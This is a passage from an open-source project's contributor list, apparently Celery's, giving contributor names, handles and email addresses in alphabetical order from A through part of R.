Alexey Zatelepin \<<ztlpn@yandex-team.ru>\> Alex Garel \<<alex@garel.org>\> Alex Hill \<<alex@hill.net.au>\> Alex Kiriukha \<<akiriukha@cogniance.com>\> Alex Koshelev \<<daevaorn@gmail.com>\> Alex Rattray \<<rattray.alex@gmail.com>\> Alex Williams \<<alex.williams@skyscanner.net>\> Alex Zaitsev \<<azaitsev@gmail.com>\> Ali Bozorgkhan \<<alibozorgkhan@gmail.com>\> Allan Caffee \<<allan.caffee@gmail.com>\> Allard Hoeve \<<allard@byte.nl>\> allenling \<<lingyiwang@haomaiyi.com>\> Alli \<<alzeih@users.noreply.github.com>\> Alman One \<<alman@laptop.home>\> Alman One \<<alman-one@laptop.home>\> alman-one \<<masiero.alain@gmail.com>\> Amir Rustamzadeh \<<amirrustam@users.noreply.github.com>\> <anand21nanda@gmail.com> \<<anand21nanda@gmail.com>\> Anarchist666 \<<Anarchist666@yandex.ru>\> Anders Pearson \<<anders@columbia.edu>\> Andrea Rabbaglietti \<<silverfix@gmail.com>\> Andreas Pelme \<<andreas@pelme.se>\> Andreas Savvides \<<andreas@editd.com>\> Andrei Fokau \<<andrei.fokau@neutron.kth.se>\> Andrew de Quincey \<<adq@lidskialf.net>\> Andrew Kittredge \<<andrewlkittredge@gmail.com>\> Andrew McFague \<<amcfague@wgen.net>\> Andrew Stewart \<<astewart@twistbioscience.com>\> Andrew Watts \<<andrewwatts@gmail.com>\> Andrew Wong \<<argsno@gmail.com>\> Andrey Voronov \<<eyvoro@users.noreply.github.com>\> Andriy Yurchuk \<<ayurchuk@minuteware.net>\> Aneil Mallavarapu \<<aneil.mallavar@gmail.com>\> anentropic \<<ego@anentropic.com>\> anh \<<anhlh2@gmail.com>\> Ankur Dedania \<<AbsoluteMSTR@gmail.com>\> Anthony Lukach \<<anthonylukach@gmail.com>\> antlegrand \<<2t.antoine@gmail.com>\> Antoine Legrand \<<antoine.legrand@smartjog.com>\> Anton \<<anton.gladkov@gmail.com>\> Anton Gladkov \<<atn18@yandex-team.ru>\> Antonin Delpeuch \<<antonin@delpeuch.eu>\> Arcadiy Ivanov \<<arcadiy@ivanov.biz>\> areski \<<areski@gmail.com>\> Armenak Baburyan \<<kanemra@gmail.com>\> Armin Ronacher \<<armin.ronacher@active-4.com>\> armo \<<kanemra@gmail.com>\> Arnaud Rocher \<<cailloumajor@users.noreply.github.com>\> arpanshah29 \<<ashah29@stanford.edu>\> Arsenio Santos \<<arsenio@gmail.com>\> Arthur Vigil \<<ahvigil@mail.sfsu.edu>\> Arthur Vuillard \<<arthur@hashbang.fr>\> Ashish Dubey \<<ashish.dubey91@gmail.com>\> Asif Saifuddin Auvi \<<auvipy@gmail.com>\> Asif Saifuddin Auvi \<<auvipy@users.noreply.github.com>\> ask \<<ask@0x61736b.net>\> Ask Solem \<<ask@celeryproject.org>\> Ask Solem \<<askh@opera.com>\> Ask Solem Hoel \<<ask@celeryproject.org>\> aydin \<<adigeaydin@gmail.com>\> baeuml \<<baeuml@kit.edu>\> Balachandran C \<<balachandran.c@gramvaani.org>\> Balthazar Rouberol \<<balthazar.rouberol@mapado.com>\> Balthazar Rouberol \<<balthazar.rouberol@ubertas.co.uk>\> bartloop \<<38962178+bartloop@users.noreply.github.com>\> Bartosz Ptaszynski \<\> Batiste Bieler \<<batiste.bieler@pix4d.com>\> bee-keeper \<<ricbottomley@gmail.com>\> Bence Tamas \<<mr.bence.tamas@gmail.com>\> Ben Firshman \<<ben@firshman.co.uk>\> Ben Welsh \<<ben.welsh@gmail.com>\> Berker Peksag \<<berker.peksag@gmail.com>\> Bert Vanderbauwhede \<<batlock666@gmail.com>\> Bert Vanderbauwhede \<<bert.vanderbauwhede@ugent.be>\> BLAGA Razvan-Paul \<<razvan.paul.blaga@gmail.com>\> bobbybeever \<<bobby.beever@yahoo.com>\> bobby \<<bobby.beever@yahoo.com>\> Bobby Powers \<<bobbypowers@gmail.com>\> Bohdan Rybak \<<bohdan.rybak@gmail.com>\> Brad Jasper \<<bjasper@gmail.com>\> Branko Čibej \<<brane@apache.org>\> BR \<<b.rabiega@gmail.com>\> Brendan MacDonell \<<macdonellba@gmail.com>\> Brendon Crawford \<<brendon@aphexcreations.net>\> Brent Watson \<<brent@brentwatson.com>\> Brian Bouterse \<<bmbouter@gmail.com>\> Brian Dixon \<<bjdixon@gmail.com>\> Brian Luan \<<jznight@gmail.com>\> Brian May \<<brian@linuxpenguins.xyz>\> Brian Peiris \<<brianpeiris@gmail.com>\> Brian Rosner \<<brosner@gmail.com>\> Brodie Rao \<<brodie@sf.io>\> Bruno Alla \<<browniebroke@users.noreply.github.com>\> Bryan Berg \<<bdb@north-eastham.org>\> Bryan Berg \<<bryan@mixedmedialabs.com>\> Bryan Bishop \<<kanzure@gmail.com>\> Bryan Helmig \<<bryan@bryanhelmig.com>\> Bryce Groff \<<bgroff@hawaii.edu>\> Caleb Mingle \<<mingle@uber.com>\> Carlos Garcia-Dubus \<<carlos.garciadm@gmail.com>\> Catalin Iacob \<<iacobcatalin@gmail.com>\> Charles McLaughlin \<<mclaughlinct@gmail.com>\> Chase Seibert \<<chase.seibert+github@gmail.com>\> ChillarAnand \<<anand21nanda@gmail.com>\> Chris Adams \<<chris@improbable.org>\> Chris Angove \<<cangove@wgen.net>\> Chris Chamberlin \<<chamberlincd@gmail.com>\> chrisclark \<<chris@untrod.com>\> Chris Harris \<<chris.harris@kitware.com>\> Chris Kuehl \<<chris@techxonline.net>\> Chris Martin \<<ch.martin@gmail.com>\> Chris Mitchell \<<chris.mit7@gmail.com>\> Chris Rose \<<offby1@offby1.net>\> Chris St. Pierre \<<chris.a.st.pierre@gmail.com>\> Chris Streeter \<<chris@chrisstreeter.com>\> Christian \<<github@penpal4u.net>\> Christoph Burgmer \<<christoph@nwebs.de>\> Christopher Hoskin \<<mans0954@users.noreply.github.com>\> Christopher Lee \<<chris@cozi.com>\> Christopher Peplin \<<github@rhubarbtech.com>\> Christopher Peplin \<<peplin@bueda.com>\> Christoph Krybus \<<ckrybus@googlemail.com>\> clayg \<<clay.gerrard@gmail.com>\> Clay Gerrard \<<clayg@clayg-desktop>.(none)\> Clemens Wolff \<<clemens@justamouse.com>\> cmclaughlin \<<mclaughlinct@gmail.com>\> Codeb Fan \<<codeb2cc@gmail.com>\> Colin McIntosh \<<colin@colinmcintosh.com>\> Conrad Kramer \<<ckrames1234@gmail.com>\> Corey Farwell \<<coreyf@rwell.org>\> Craig Younkins \<<cyounkins@Craigs-MacBook-Pro.local>\> csfeathers \<<csfeathers@users.noreply.github.com>\> Cullen Rhodes \<<rhodes.cullen@yahoo.co.uk>\> daftshady \<<daftonshady@gmail.com>\> Dan \<<dmtaub@gmail.com>\> Dan Hackner \<<dan.hackner@gmail.com>\> Daniel Devine \<<devine@ddevnet.net>\> Daniele Procida \<<daniele@vurt.org>\> Daniel Hahler \<<github@thequod.de>\> Daniel Hepper \<<daniel.hepper@gmail.com>\> Daniel Huang \<<dxhuang@gmail.com>\> Daniel Lundin \<<daniel.lundin@trioptima.com>\> Daniel Lundin \<<dln@eintr.org>\> Daniel Watkins \<<daniel@daniel-watkins.co.uk>\> Danilo Bargen \<<mail@dbrgn.ch>\> Dan McGee \<<dan@archlinux.org>\> Dan McGee \<<dpmcgee@gmail.com>\> Dan Wilson \<<danjwilson@gmail.com>\> Daodao \<<daodaod@gmail.com>\> Dave Smith \<<dave@thesmithfam.org>\> Dave Smith \<<dsmith@hirevue.com>\> David Arthur \<<darthur@digitalsmiths.com>\> David Arthur \<<mumrah@gmail.com>\> David Baumgold \<<david@davidbaumgold.com>\> David Cramer \<<dcramer@gmail.com>\> David Davis \<<daviddavis@users.noreply.github.com>\> David Harrigan \<<dharrigan118@gmail.com>\> David Harrigan \<<dharrigan@dyn.com>\> David Markey \<<dmarkey@localhost.localdomain>\> David Miller \<<david@deadpansincerity.com>\> David Miller \<<il.livid.dream@gmail.com>\> David Pravec \<<David.Pravec@danix.org>\> David Pravec \<<david.pravec@nethost.cz>\> David Strauss \<<david@davidstrauss.net>\> David White \<<dpwhite2@ncsu.edu>\> DDevine \<<devine@ddevnet.net>\> Denis Podlesniy \<<Haos616@Gmail.com>\> Denis Shirokov \<<dan@rexuni.com>\> Dennis Brakhane \<<dennis.brakhane@inoio.de>\> Derek Harland \<<donkopotamus@users.noreply.github.com>\> derek\_kim \<<bluewhale8202@gmail.com>\> dessant \<<dessant@users.noreply.github.com>\> Dieter Adriaenssens \<<ruleant@users.sourceforge.net>\> Dima Kurguzov \<<koorgoo@gmail.com>\> dimka665 \<<dimka665@gmail.com>\> dimlev \<<dimlev@gmail.com>\> dmarkey \<<david@dmarkey.com>\> Dmitry Malinovsky \<<damalinov@gmail.com>\> Dmitry Malinovsky \<<dmalinovsky@thumbtack.net>\> dmollerm \<<d.moller.m@gmail.com>\> Dmytro Petruk \<<bavaria95@gmail.com>\> dolugen \<<dolugen@gmail.com>\> dongweiming \<<ciici1234@hotmail.com>\> dongweiming \<<ciici123@gmail.com>\> Dongweiming \<<ciici123@gmail.com>\> dtheodor \<<dimitris.theodorou@gmail.com>\> Dudás Ádám \<<sir.dudas.adam@gmail.com>\> Dustin J. Mitchell \<<dustin@mozilla.com>\> D. Yu \<<darylyu@users.noreply.github.com>\> Ed Morley \<<edmorley@users.noreply.github.com>\> Eduardo Ramírez \<<ejramire@uc.cl>\> Edward Betts \<<edward@4angle.com>\> Emil Stanchev \<<stanchev.emil@gmail.com>\> Eran Rundstein \<<eran@sandsquid>.(none)\> ergo \<<ergo@debian.Belkin>\> Eric Poelke \<<epoelke@gmail.com>\> Eric Zarowny \<<ezarowny@gmail.com>\> ernop \<<ernestfrench@gmail.com>\> Evgeniy \<<quick.es@gmail.com>\> evildmp \<<daniele@apple-juice.co.uk>\> fatihsucu \<<fatihsucu0@gmail.com>\> Fatih Sucu \<<fatihsucu@users.noreply.github.com>\> Feanil Patel \<<feanil@edx.org>\> Felipe \<<fcoelho@users.noreply.github.com>\> Felipe Godói Rosário \<<felipe.rosario@geru.com.br>\> Felix Berger \<<bflat1@gmx.net>\> Fengyuan Chen \<<cfy1990@gmail.com>\> Fernando Rocha \<<fernandogrd@gmail.com>\> ffeast \<<ffeast@gmail.com>\> Flavio Percoco Premoli \<<flaper87@gmail.com>\> Florian Apolloner \<<apollo13@apolloner.eu>\> Florian Apolloner \<<florian@apollo13>.(none)\> Florian Demmer \<<fdemmer@gmail.com>\> flyingfoxlee \<<lingyunzhi312@gmail.com>\> Francois Visconte \<<f.visconte@gmail.com>\> François Voron \<<fvoron@gmail.com>\> Frédéric Junod \<<frederic.junod@camptocamp.com>\> fredj \<<frederic.junod@camptocamp.com>\> frol \<<frolvlad@gmail.com>\> Gabriel \<<gabrielpjordao@gmail.com>\> Gao Jiangmiao \<<gao.jiangmiao@h3c.com>\> GDR\! \<<gdr@gdr.name>\> GDvalle \<<GDvalle@users.noreply.github.com>\> Geoffrey Bauduin \<<bauduin.geo@gmail.com>\> georgepsarakis \<<giwrgos.psarakis@gmail.com>\> George Psarakis \<<giwrgos.psarakis@gmail.com>\> George Sibble \<<gsibble@gmail.com>\> George Tantiras \<<raratiru@users.noreply.github.com>\> Georgy Cheshkov \<<medoslav@gmail.com>\> Gerald Manipon \<<pymonger@gmail.com>\> German M. Bravo \<<german.mb@deipi.com>\> Gert Van Gool \<<gertvangool@gmail.com>\> Gilles Dartiguelongue \<<gilles.dartiguelongue@esiee.org>\> Gino Ledesma \<<gledesma@apple.com>\> gmanipon \<<gmanipon@jpl.nasa.gov>\> Grant Thomas \<<jgrantthomas@gmail.com>\> Greg Haskins \<<greg@greghaskins.com>\> gregoire \<<gregoire@audacy.fr>\> Greg Taylor \<<gtaylor@duointeractive.com>\> Greg Wilbur \<<gwilbur@bloomberg.net>\> Guillaume Gauvrit \<<guillaume@gandi.net>\> Guillaume Gendre \<<dzb.rtz@gmail.com>\> Gun.io Whitespace Robot \<<contact@gun.io>\> Gunnlaugur Thor Briem \<<gunnlaugur@gmail.com>\> harm \<<harm.verhagen@gmail.com>\> Harm Verhagen \<<harm.verhagen@gmail.com>\> Harry Moreno \<<morenoh149@gmail.com>\> hclihn \<<23141651+hclihn@users.noreply.github.com>\> hekevintran \<<hekevintran@gmail.com>\> honux \<<atoahp@hotmail.com>\> Honza Kral \<<honza.kral@gmail.com>\> Honza Král \<<Honza.Kral@gmail.com>\> Hooksie \<<me@matthooks.com>\> Hsiaoming Yang \<<me@lepture.com>\> Huang Huang \<<mozillazg101@gmail.com>\> Hynek Schlawack \<<hs@ox.cx>\> Hynek Schlawack \<<schlawack@variomedia.de>\> Ian Dees \<<ian.dees@gmail.com>\> Ian McCracken \<<ian.mccracken@gmail.com>\> Ian Wilson \<<ian.owings@gmail.com>\> Idan Kamara \<<idankk86@gmail.com>\> Ignas Mikalajūnas \<<ignas.mikalajunas@gmail.com>\> Igor Kasianov \<<super.hang.glider@gmail.com>\> illes \<<illes.solt@gmail.com>\> Ilya \<<4beast@gmail.com>\> Ilya Georgievsky \<<i.georgievsky@drweb.com>\> Ionel Cristian Mărieș \<<contact@ionelmc.ro>\> Ionel Maries Cristian \<<contact@ionelmc.ro>\> Ionut Turturica \<<jonozzz@yahoo.com>\> Iurii Kriachko \<<iurii.kriachko@gmail.com>\> Ivan Metzlar \<<metzlar@gmail.com>\> Ivan Virabyan \<<i.virabyan@gmail.com>\> j0hnsmith \<<info@whywouldwe.com>\> Jackie Leng \<<Jackie.Leng@nelen-schuurmans.nl>\> J Alan Brogan \<<jalanb@users.noreply.github.com>\> Jameel Al-Aziz \<<me@jalaziz.net>\> James M. Allen \<<james.m.allen@gmail.com>\> James Michael DuPont \<<JamesMikeDuPont@gmail.com>\> James Pulec \<<jpulec@gmail.com>\> James Remeika \<<james@remeika.us>\> Jamie Alessio \<<jamie@stoic.net>\> Jannis Leidel \<<jannis@leidel.info>\> Jared Biel \<<jared.biel@bolderthinking.com>\> Jason Baker \<<amnorvend@gmail.com>\> Jason Baker \<<jason@ubuntu.ubuntu-domain>\> Jason Veatch \<<jtveatch@gmail.com>\> Jasper Bryant-Greene \<<jbg@rf.net.nz>\> Javier Domingo Cansino \<<javierdo1@gmail.com>\> Javier Martin Montull \<<javier.martin.montull@cern.ch>\> Jay Farrimond \<<jay@instaedu.com>\> Jay McGrath \<<jaymcgrath@users.noreply.github.com>\> jbiel \<<jared.biel@bolderthinking.com>\> jbochi \<<jbochi@gmail.com>\> Jed Smith \<<jed@jedsmith.org>\> Jeff Balogh \<<github@jeffbalogh.org>\> Jeff Balogh \<<me@jeffbalogh.org>\> Jeff Terrace \<<jterrace@gmail.com>\> Jeff Widman \<<jeff@jeffwidman.com>\> Jelle Verstraaten \<<jelle.verstraaten@xs4all.nl>\> Jeremy Cline \<<jeremy@jcline.org>\> Jeremy Zafran \<<jeremy.zafran@cloudlock.com>\> jerry \<<jerry@stellaservice.com>\> Jerzy Kozera \<<jerzy.kozera@gmail.com>\> Jerzy Kozera \<<jerzy.kozera@sensisoft.com>\> jespern \<<jesper@noehr.org>\> Jesper Noehr \<<jespern@jesper-noehrs-macbook-pro.local>\> Jesse \<<jvanderdoes@gmail.com>\> jess \<<jessachandler@gmail.com>\> Jess Johnson \<<jess@grokcode.com>\> Jian Yu \<<askingyj@gmail.com>\> JJ \<<jairojair@gmail.com>\> João Ricardo \<<joaoricardo000@gmail.com>\> Jocelyn Delalande \<<jdelalande@oasiswork.fr>\> JocelynDelalande \<<JocelynDelalande@users.noreply.github.com>\> Joe Jevnik \<<JoeJev@gmail.com>\> Joe Sanford \<<joe@cs.tufts.edu>\> Joe Sanford \<<josephsanford@gmail.com>\> Joey Wilhelm \<<tarkatronic@gmail.com>\> John Anderson \<<sontek@gmail.com>\> John Arnold \<<johnar@microsoft.com>\> John Barham \<<jbarham@gmail.com>\> John Watson \<<john@dctrwatson.com>\> John Watson \<<john@disqus.com>\> John Watson \<<johnw@mahalo.com>\> John Whitlock \<<John-Whitlock@ieee.org>\> Jonas Haag \<<jonas@lophus.org>\> Jonas Obrist \<<me@ojii.ch>\> Jonatan Heyman \<<jonatan@heyman.info>\> Jonathan Jordan \<<jonathan@metaltoad.com>\> Jonathan Sundqvist \<<sundqvist.jonathan@gmail.com>\> jonathan vanasco \<<jonathan@2xlp.com>\> Jon Chen \<<bsd@voltaire.sh>\> Jon Dufresne \<<jon.dufresne@gmail.com>\> Josh \<<kaizoku@phear.cc>\> Josh Kupershmidt \<<schmiddy@gmail.com>\> Joshua "jag" Ginsberg \<<jag@flowtheory.net>\> Josue Balandrano Coronel \<<xirdneh@gmail.com>\> Jozef \<<knaperek@users.noreply.github.com>\> jpellerin \<<jpellerin@jpdesk>.(none)\> jpellerin \<<none@none>\> JP \<<jpellerin@gmail.com>\> JTill \<<jtillman@hearsaycorp.com>\> Juan Gutierrez \<<juanny.gee@gmail.com>\> Juan Ignacio Catalano \<<catalanojuan@gmail.com>\> Juan Rossi \<<juan@getmango.com>\> Juarez Bochi \<<jbochi@gmail.com>\> Jude Nagurney \<<jude@pwan.org>\> Julien Deniau \<<julien@sitioweb.fr>\> julienp \<<julien@caffeine.lu>\> Julien Poissonnier \<<julien@caffeine.lu>\> Jun Sakai \<<jsakai@splunk.com>\> Justin Patrin \<<jpatrin@skyhighnetworks.com>\> Justin Patrin \<<papercrane@reversefold.com>\> Kalle Bronsen \<<bronsen@nrrd.de>\> kamalgill \<<kamalgill@mac.com>\> Kamil Breguła \<<mik-laj@users.noreply.github.com>\> Kanan Rahimov \<<mail@kenanbek.me>\> Kareem Zidane \<<kzidane@cs50.harvard.edu>\> Keith Perkins \<<keith@tasteoftheworld.us>\> Ken Fromm \<<ken@frommworldwide.com>\> Ken Reese \<<krrg@users.noreply.github.com>\> keves \<<e@keves.org>\> Kevin Gu \<<guqi@reyagroup.com>\> Kevin Harvey \<<kharvey@axialhealthcare.com>\> Kevin McCarthy \<<me@kevinmccarthy.org>\> Kevin Richardson \<<kevin.f.richardson@gmail.com>\> Kevin Richardson \<<kevin@kevinrichardson.co>\> Kevin Tran \<<hekevintran@gmail.com>\> Kieran Brownlees \<<kbrownlees@users.noreply.github.com>\> Kirill Pavlov \<<pavlov99@yandex.ru>\> Kirill Romanov \<<djaler1@gmail.com>\> komu \<<komuw05@gmail.com>\> Konstantinos Koukopoulos \<<koukopoulos@gmail.com>\> Konstantin Podshumok \<<kpp.live@gmail.com>\> Kornelijus Survila \<<kornholijo@gmail.com>\> Kouhei Maeda \<<mkouhei@gmail.com>\> Kracekumar Ramaraju \<<me@kracekumar.com>\> Krzysztof Bujniewicz \<<k.bujniewicz@bankier.pl>\> kuno \<<neokuno@gmail.com>\> Kxrr \<<Hi@Kxrr.Us>\> Kyle Kelley \<<rgbkrk@gmail.com>\> Laurent Peuch \<<cortex@worlddomination.be>\> lead2gold \<<caronc@users.noreply.github.com>\> Leo Dirac \<<leo@banyanbranch.com>\> Leo Singer \<<leo.singer@ligo.org>\> Lewis M. Kabui \<<lewis.maina@andela.com>\> llllllllll \<<joejev@gmail.com>\> Locker537 \<<Locker537@gmail.com>\> Loic Bistuer \<<loic.bistuer@sixmedia.com>\> Loisaida Sam \<<sam.sandberg@gmail.com>\> lookfwd \<<lookfwd@gmail.com>\> Loren Abrams \<<labrams@hearsaycorp.com>\> Loren Abrams \<<loren.abrams@gmail.com>\> Lucas Wiman \<<lucaswiman@counsyl.com>\> lucio \<<lucio@prometeo.spirit.net.ar>\> Luis Clara Gomez \<<ekkolabs@gmail.com>\> Lukas Linhart \<<lukas.linhart@centrumholdings.com>\> Łukasz Kożuchowski \<<lukasz.kozuchowski@10clouds.com>\> Łukasz Langa \<<lukasz@langa.pl>\> Łukasz Oleś \<<lukaszoles@gmail.com>\> Luke Burden \<<lukeburden@gmail.com>\> Luke Hutscal \<<luke@creaturecreative.com>\> Luke Plant \<<L.Plant.98@cantab.net>\> Luke Pomfrey \<<luke.pomfrey@titanemail.com>\> Luke Zapart \<<drx@drx.pl>\> mabouels \<<abouelsaoud@gmail.com>\> Maciej Obuchowski \<<obuchowski.maciej@gmail.com>\> Mads Jensen \<<mje@inducks.org>\> Manuel Kaufmann \<<humitos@gmail.com>\> Manuel Vázquez Acosta \<<mvaled@users.noreply.github.com>\> Marat Sharafutdinov \<<decaz89@gmail.com>\> Marcelo Da Cruz Pinto \<<Marcelo_DaCruzPinto@McAfee.com>\> Marc Gibbons \<<marc_gibbons@rogers.com>\> Marc Hörsken \<<mback2k@users.noreply.github.com>\> Marcin Kuźmiński \<<marcin@python-blog.com>\> marcinkuzminski \<<marcin@python-works.com>\> Marcio Ribeiro \<<binary@b1n.org>\> Marco Buttu \<<marco.buttu@gmail.com>\> Marco Schweighauser \<<marco@mailrelay.ch>\> mariia-zelenova \<<32500603+mariia-zelenova@users.noreply.github.com>\> Marin Atanasov Nikolov \<<dnaeon@gmail.com>\> Marius Gedminas \<<marius@gedmin.as>\> mark hellewell \<<mark.hellewell@gmail.com>\> Mark Lavin \<<markdlavin@gmail.com>\> Mark Lavin \<<mlavin@caktusgroup.com>\> Mark Parncutt \<<me@markparncutt.com>\> Mark Story \<<mark@freshbooks.com>\> Mark Stover \<<stovenator@gmail.com>\> Mark Thurman \<<mthurman@gmail.com>\> Markus Kaiserswerth \<<github@sensun.org>\> Markus Ullmann \<<mail@markus-ullmann.de>\> martialp \<<martialp@users.noreply.github.com>\> Martin Davidsson \<<martin@dropcam.com>\> Martin Galpin \<<m@66laps.com>\> Martin Melin \<<git@martinmelin.com>\> Matt Davis \<<matteius@gmail.com>\> Matthew Duggan \<<mgithub@guarana.org>\> Matthew J Morrison \<<mattj.morrison@gmail.com>\> Matthew Miller \<<matthewgarrettmiller@gmail.com>\> Matthew Schinckel \<<matt@schinckel.net>\> mattlong \<<matt@crocodoc.com>\> Matt Long \<<matt@crocodoc.com>\> Matt Robenolt \<<matt@ydekproductions.com>\> Matt Robenolt \<<m@robenolt.com>\> Matt Williamson \<<dawsdesign@gmail.com>\> Matt Williamson \<<matt@appdelegateinc.com>\> Matt Wise \<<matt@nextdoor.com>\> Matt Woodyard \<<matt@mattwoodyard.com>\> Mauro Rocco \<<fireantology@gmail.com>\> Maxim Bodyansky \<<maxim@viking>.(none)\> Maxime Beauchemin \<<maxime.beauchemin@apache.org>\> Maxime Vdb \<<mvergerdelbove@work4labs.com>\> Mayflower \<<fucongwang@gmail.com>\> mbacho \<<mbacho@users.noreply.github.com>\> mher \<<mher.movsisyan@gmail.com>\> Mher Movsisyan \<<mher.movsisyan@gmail.com>\> Michael Aquilina \<<michaelaquilina@gmail.com>\> Michael Duane Mooring \<<mikeumus@gmail.com>\> Michael Elsdoerfer <michael@elsdoerfer.com> \<<michael@puppetmaster>.(none)\> Michael Elsdorfer \<<michael@elsdoerfer.com>\> Michael Elsdörfer \<<michael@elsdoerfer.com>\> Michael Fladischer \<<FladischerMichael@fladi.at>\> Michael Floering \<<michaelfloering@gmail.com>\> Michael Howitz \<<mh@gocept.com>\> michael \<<michael@giver.dpool.org>\> Michael \<<michael-k@users.noreply.github.com>\> michael \<<michael@puppetmaster>.(none)\> Michael Peake \<<michaeljpeake@icloud.com>\> Michael Permana \<<michael@origamilogic.com>\> Michael Permana \<<mpermana@hotmail.com>\> Michael Robellard \<<mikerobellard@onshift.com>\> Michael Robellard \<<mrobellard@onshift.com>\> Michal Kuffa \<<beezz@users.noreply.github.com>\> Miguel Hernandez Martos \<<enlavin@gmail.com>\> Mike Attwood \<<mike@cybersponse.com>\> Mike Chen \<<yi.chen.it@gmail.com>\> Mike Helmick \<<michaelhelmick@users.noreply.github.com>\> mikemccabe \<<mike@mcca.be>\> Mikhail Gusarov \<<dottedmag@dottedmag.net>\> Mikhail Korobov \<<kmike84@gmail.com>\> Mikołaj \<<mikolevy1@gmail.com>\> Milen Pavlov \<<milen.pavlov@gmail.com>\> Misha Wolfson \<<myw@users.noreply.github.com>\> Mitar \<<mitar.github@tnode.com>\> Mitar \<<mitar@tnode.com>\> Mitchel Humpherys \<<mitch.special@gmail.com>\> mklauber \<<matt+github@mklauber.com>\> mlissner \<<mlissner@michaeljaylissner.com>\> monkut \<<nafein@hotmail.com>\> Morgan Doocy \<<morgan@doocy.net>\> Morris Tweed \<<tweed.morris@gmail.com>\> Morton Fox \<<github@qslw.com>\> Môshe van der Sterre \<<me@moshe.nl>\> Moussa Taifi \<<moutai10@gmail.com>\> mozillazg \<<opensource.mozillazg@gmail.com>\> mpavlov \<<milen.pavlov@gmail.com>\> mperice \<<mperice@users.noreply.github.com>\> mrmmm \<<mohammad.almeer@gmail.com>\> Muneyuki Noguchi \<<nogu.dev@gmail.com>\> m-vdb \<<mvergerdelbove@work4labs.com>\> nadad \<<nadad6@gmail.com>\> Nathaniel Varona \<<nathaniel.varona@gmail.com>\> Nathan Van Gheem \<<vangheem@gmail.com>\> Nat Williams \<<nat.williams@gmail.com>\> Neil Chintomby \<<mace033@gmail.com>\> Neil Chintomby \<<neil@mochimedia.com>\> Nicholas Pilon \<<npilon@gmail.com>\> nicholsonjf \<<nicholsonjf@gmail.com>\> Nick Eaket \<<4418194+neaket360pi@users.noreply.github.com>\> Nick Johnson \<<njohnson@limcollective.com>\> Nicolas Mota \<<nicolas_mota@live.com>\> nicolasunravel \<<nicolas@unravel.ie>\> Niklas Aldergren \<<niklas@aldergren.com>\> Noah Kantrowitz \<<noah@coderanger.net>\> Noel Remy \<<mocramis@gmail.com>\> NoKriK \<<nokrik@nokrik.net>\> Norman Richards \<<orb@nostacktrace.com>\> NotSqrt \<<notsqrt@gmail.com>\> nott \<<reg@nott.cc>\> ocean1 \<<ocean1@users.noreply.github.com>\> ocean1 \<<ocean_ieee@yahoo.it>\> ocean1 \<<ocean.kuzuri@gmail.com>\> OddBloke \<<daniel.watkins@glassesdirect.com>\> Oleg Anashkin \<<oleg.anashkin@gmail.com>\> Olivier Aubert \<<contact@olivieraubert.net>\> Omar Khan \<<omar@omarkhan.me>\> Omer Katz \<<omer.drow@gmail.com>\> Omer Korner \<<omerkorner@gmail.com>\> orarbel \<<orarbel@gmail.com>\> orf \<<tom@tomforb.es>\> Ori Hoch \<<ori@uumpa.com>\> outself \<<yura.nevsky@gmail.com>\> Pablo Marti \<<pmargam@gmail.com>\> pachewise \<<pachewise@users.noreply.github.com>\> partizan \<<serg.partizan@gmail.com>\> Pär Wieslander \<<wieslander@gmail.com>\> Patrick Altman \<<paltman@gmail.com>\> Patrick Cloke \<<clokep@users.noreply.github.com>\> Patrick \<<paltman@gmail.com>\> Patrick Stegmann \<<code@patrick-stegmann.de>\> Patrick Stegmann \<<wonderb0lt@users.noreply.github.com>\> Patrick Zhang \<<patdujour@gmail.com>\> Paul English \<<paul@onfrst.com>\> Paul Jensen \<<pjensen@interactdirect.com>\> Paul Kilgo \<<pkilgo@clemson.edu>\> Paul McMillan \<<paul.mcmillan@nebula.com>\> Paul McMillan \<<Paul@McMillan.ws>\> Paulo \<<PauloPeres@users.noreply.github.com>\> Paul Pearce \<<pearce@cs.berkeley.edu>\> Pavel Savchenko \<<pavel@modlinltd.com>\> Pavlo Kapyshin \<<i@93z.org>\> pegler \<<pegler@gmail.com>\> Pepijn de Vos \<<pepijndevos@gmail.com>\> Peter Bittner \<<django@bittner.it>\> Peter Brook \<<peter.d.brook@gmail.com>\> Philip Garnero \<<philip.garnero@corp.ovh.com>\> Pierre Fersing \<<pierref@pierref.org>\> Piotr Maślanka \<<piotr.maslanka@henrietta.com.pl>\> Piotr Sikora \<<piotr.sikora@frickle.com>\> PMickael \<<exploze@gmail.com>\> PMickael \<<mickael.penhard@gmail.com>\> Polina Giralt \<<polina.giralt@gmail.com>\> precious \<<vs.kulaga@gmail.com>\> Preston Moore \<<prestonkmoore@gmail.com>\> Primož Kerin \<<kerin.primoz@gmail.com>\> Pysaoke \<<pysaoke@gmail.com>\> Rachel Johnson \<<racheljohnson457@gmail.com>\> Rachel Willmer \<<rachel@willmer.org>\> raducc \<<raducc@users.noreply.github.com>\> Raf Geens \<<rafgeens@gmail.com>\> Raghuram Srinivasan \<<raghu@set.tv>\> Raphaël Riel \<<raphael.riel@gmail.com>\> Raphaël Slinckx \<<rslinckx@gmail.com>\> Régis B \<<github@behmo.com>\> Remigiusz Modrzejewski \<<lrem@maxnet.org.pl>\> Rémi Marenco \<<remi.marenco@gmail.com>\> rfkrocktk \<<rfkrocktk@gmail.com>\> Rick van Hattem \<<rick.van.hattem@fawo.nl>\> Rick Wargo \<<rickwargo@users.noreply.github.com>\> Rico Moorman \<<rico.moorman@gmail.com>\> Rik \<<gitaarik@gmail.com>\> Rinat Shigapov \<<rinatshigapov@gmail.com>\> Riyad Parvez \<<social.riyad@gmail.com>\> rlotun \<<rlotun@gmail.com>\> rnoel \<<rnoel@ltutech.com>\> Robert Knight \<<robertknight@gmail.com>\> Roberto Gaiser \<<gaiser@geekbunker.org>\> roderick \<<mail@roderick.de>\> Rodolphe Quiedeville \<<rodolphe@quiedeville.org>\> Roger Hu \<<rhu@hearsaycorp.com>\> Roger Hu \<<roger.hu@gmail.com>\> Roman Imankulov \<<roman@netangels.ru>\> Roman Sichny \<<roman@sichnyi.com>\> Romuald Brunet \<<romuald@gandi.net>\> Ronan Amicel \<<ronan.amicel@gmail.com>\> Ross Deane \<<ross.deane@gmail.com>\> Ross Lawley \<<ross.lawley@gmail.com>\> Ross Patterson \<<me@rpatterson.net>\> Ross \<<ross@duedil.com>\> Rudy Attias \<<rudy.attias@gmail.com>\> rumyana neykova \<<rumi.neykova@gmail.com>\> Rumyana Neykova \<<rumi.neykova@gmail.com>\> Rune Halvorsen \<<runefh@gmail.com>\> Rune Halvorsen \<<runeh@vorkosigan>.(none)\> runeh 